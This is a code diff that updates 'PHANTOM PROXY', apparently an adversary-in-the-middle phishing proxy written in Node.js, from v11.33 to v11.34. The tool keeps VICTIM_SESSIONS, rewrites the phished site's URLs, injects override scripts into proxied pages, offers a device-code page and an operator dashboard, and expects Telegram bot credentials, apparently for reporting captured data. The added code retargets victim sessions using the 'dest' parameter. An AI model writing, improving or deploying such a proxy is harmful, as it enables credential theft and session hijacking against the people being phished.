@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v11.33 — FULL WITH WEBSOCKET + REPLAY FIX + GLOBAL REWRITE
+// 🥔 PHANTOM PROXY v11.34 — FULL FIX FOR GET DEST PARAM PARSING
 // ============================================================
-// All previous fixes + global rewriteUrl + client location override + SW rewrite
+// All previous fixes + GET dest param parsing + session update fix
 // ============================================================
 
 const http = require("http");
@@ -723,7 +723,7 @@ function updateHTMLProxyResponse(body) {
 
     const overrideScript = `
 <script>
-console.log('🔥 PHANTOM v11.33 CLIENT LOADED');
+console.log('🔥 PHANTOM v11.34 CLIENT LOADED');
 (function() {
     const proxyPath = '${PROXY_PATHNAMES.proxy}';
     const destParam = '${PHISHED_URL_PARAMETER}';
@@ -2220,7 +2220,7 @@ const server = http.createServer(async (req, res) => {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
             status: 'healthy',
-            version: '11.33',
+            version: '11.34',
             timestamp: new Date().toISOString()
         }));
         return;
@@ -2560,6 +2560,25 @@ const server = http.createServer(async (req, res) => {
                         return;
                     }
 
+                    // 🔥 FIX: Parse dest parameter for ANY request to /gateway/... with query string
+                    const hasDestParam = url.includes(PHISHED_URL_PARAMETER);
+                    if (hasDestParam) {
+                        const match = url.match(PHISHED_URL_REGEXP);
+                        if (match) {
+                            try {
+                                const destUrl = new URL(decodeURIComponent(match[0]));
+                                VICTIM_SESSIONS[currentSession].protocol = destUrl.protocol;
+                                VICTIM_SESSIONS[currentSession].hostname = destUrl.hostname;
+                                VICTIM_SESSIONS[currentSession].path = destUrl.pathname + destUrl.search;
+                                VICTIM_SESSIONS[currentSession].port = destUrl.port || (destUrl.protocol === 'https:' ? 443 : 80);
+                                VICTIM_SESSIONS[currentSession].host = destUrl.host;
+                                console.log(`[PROXY] 🔥 Force-updated session target to dest param: ${destUrl.host}${VICTIM_SESSIONS[currentSession].path}`);
+                            } catch (e) {
+                                console.error('[PROXY] Failed to parse dest URL from GET request:', e.message);
+                            }
+                        }
+                    }
+
                     let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                     const proxyRequestOptions = {
                         hostname: VICTIM_SESSIONS[currentSession].hostname,
@@ -2682,7 +2701,6 @@ const server = http.createServer(async (req, res) => {
                             if (rewritten !== location) {
                                 proxyResponse.headers.location = rewritten;
                                 console.log(`[REDIRECT] Rewrote: ${location} -> ${rewritten}`);
-                                // Also update session if needed (the rewritten URL will be followed by browser)
                             } else {
                                 console.log(`[REDIRECT] No rewrite needed for: ${location}`);
                             }
@@ -3044,7 +3062,7 @@ server.on('error', (err) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v11.33 running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v11.34 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
@@ -3065,6 +3083,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Max open log streams: ${MAX_OPEN_STREAMS}`);
     console.log(`🔧 FIXED: Global rewriteUrl applied to redirects, HTML, client JS, and SW.`);
     console.log(`🔧 FIXED: Client window.location overrides added.`);
+    console.log(`🔧 FIXED: GET /gateway/...?dest=... now correctly updates session target.`);
 
     if (!BOT_TOKEN || !CHAT_ID) {
         console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
